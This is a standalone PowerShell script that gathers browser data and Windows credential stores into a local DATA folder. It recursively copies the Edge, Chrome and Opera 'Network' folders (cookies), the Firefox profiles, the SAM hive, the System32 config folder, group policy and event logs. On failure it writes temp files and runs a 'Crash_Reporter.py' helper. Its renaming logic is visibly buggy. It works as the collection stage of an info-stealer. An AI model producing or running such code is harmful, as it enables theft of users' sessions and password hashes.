# Define the list of source paths with placeholders
$sourcePaths = @(
    "C:\Users\{}\AppData\Local\Microsoft\Edge\User Data\Default\Network",
    "C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\Network",
    "C:\Users\{}\AppData\Roaming\Mozilla\Firefox\Profiles",
    "C:\Users\{}\AppData\Roaming\Opera Software\Opera Stable\Network",
    "C:\Users\{}\AppData\Roaming\Opera Software\Opera GX Stable\Network",
    'C:\\WINDOWS\\system32\\config\\SAM',
    'C:\\Windows\\System32\\config',
    'C:\\Windows\\System32\\GroupPolicy',
    'C:\\Windows\\System32\\GroupPolicyUsers',
    'C:\\Windows\\System32\\winevt\\Logs'
)

# Define the list of identifiers for renaming
$identifiers = @(
    "Edge",
    "Chrome",
    "Firefox",
    "OperaStable",
    "OperaGXStable",
    "SAM",
    "SystemConfig",
    "GroupPolicy",
    "GroupPolicyUsers",
    "WindowsEventLogs"
)

# Get the current user's name
$currentUser = $env:USERNAME

# Define the base directory for the destination
$baseDirectory = "DATA"

function Invoke-CrashReport
{
    param(
        [string]$ErrorId,
        [string]$FunctionNo,
        [string]$ErrorContent,
        [string]$Type
    )

    # Prepare the data to write to the temporary files
    $ScriptName = Split-Path -Leaf $PSCommandPath
    $Language = "ps1" # Since this is a PowerShell script, the language is PowerShell

    # Write the name of the placeholder script to the temporary file
    Set-Content -Path "flag.temp" -Value $ScriptName

    # Write the error message to the temporary file
    Set-Content -Path "error.temp" -Value $ErrorId

    # Write the name of the placeholder function to the temporary file
    Set-Content -Path "function.temp" -Value $FunctionNo

    # Write the name of the placeholder language to the temporary file
    Set-Content -Path "language.temp" -Value $Language

    # Write the name of the placeholder crash to the temporary file
    Set-Content -Path "error_data.temp" -Value $ErrorContent

    # Write the type to the temporary file
    Set-Content -Path "type.temp" -Value $Type

    # Execute Crash_Reporter.py in a new shell window and capture its output
    # Note: Adjust the path to Crash_Reporter.py as necessary
    $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessInfo.FileName = "powershell.exe"
    $ProcessInfo.RedirectStandardOutput = $true
    $ProcessInfo.UseShellExecute = $false
    $ProcessInfo.Arguments = "-Command python .\Crash_Reporter.py" # Adjusted to run Python script

    $Process = New-Object System.Diagnostics.Process
    $Process.StartInfo = $ProcessInfo
    [void]$Process.Start()

    # Read the output
    while (-not $Process.StandardOutput.EndOfStream)
    {
        $line = $Process.StandardOutput.ReadLine()
        Write-Host $line
    }

    # Wait for the process to exit
    $Process.WaitForExit()
}

# Function to check if a path exists and is accessible
function Test-PathAndAccess($path)
{
    return Test-Path $path -PathType Container -ErrorAction SilentlyContinue
}

# Loop through each source path
foreach ($sourcePath in $sourcePaths)
{
    # Replace the placeholder with the current user's name
    $fullSourcePath = $sourcePath -replace '\{\}', $currentUser

    # Enhanced error checking for source path existence and accessibility
    if (-not (Test-PathAndAccess $fullSourcePath))
    {
        Write-Host "WARNING: Source path $fullSourcePath does not exist or cannot be accessed."
        continue
    }


    # Extract the identifier from the source path using the corresponding index from the $identifiers array
    try
    {
        $index = [Array]::IndexOf($identifiers, $sourcePath.Split('\')[-1].Split('\\')[-1])
        $identifier = $identifiers[$index]
    }
    catch
    {
        Write-Host "WARNING: Failed to extract identifier from source path $fullSourcePath."
        continue
    }


    # Define the destination path
    $destinationPath = Join-Path -Path $baseDirectory -ChildPath "USER_$identifier"

    # Enhanced error checking for destination directory existence
    if (-not (Test-PathAndAccess $destinationPath))
    {
        New-Item -ItemType Directory -Path $destinationPath -Force | Out-Null
    }

    # Attempt to copy the folder to the DATA directory and rename it
    try
    {
        Copy-Item -Path $fullSourcePath -Destination $destinationPath -Recurse -Force -ErrorAction SilentlyContinue
        # Print the success message to the console
        Write-Host "INFO: Successfully copied $fullSourcePath to $destinationPath"
    }
    catch
    {
        # Detailed error handling
        Write-Host "ERROR: An error occurred while copying $fullSourcePath to $destinationPath. Error: $_"
        Invoke-CrashReport -ErrorId "OGE" -FunctionNo "fun93" -ErrorContent $_ -Type "crash"
        exit
    }
}
